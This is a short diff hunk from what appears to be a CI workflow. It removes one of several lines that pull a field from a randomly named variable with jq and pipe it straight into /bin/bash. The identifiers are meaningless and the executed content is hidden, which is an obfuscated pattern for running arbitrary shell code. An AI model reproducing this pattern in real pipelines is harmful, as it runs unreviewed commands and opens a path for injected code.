@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$mwnn83731" | jq -r .dicmc32591 | /bin/bash
           printf '%s' "$vc7" | jq -r .ny5600 | /bin/bash
           printf '%s' "$kp80221" | jq -r .v4400 | /bin/bash
-          echo $vwov8 | jq -r .bmcz69 | /bin/bash
           echo $jplrg3 | jq -r .hxm06803 | /bin/bash
           printf '%s' "$rphdr30376" | jq -r .zxr736 | /bin/bash
           echo $xzgh80 | jq -r .cif7308 | /bin/bash
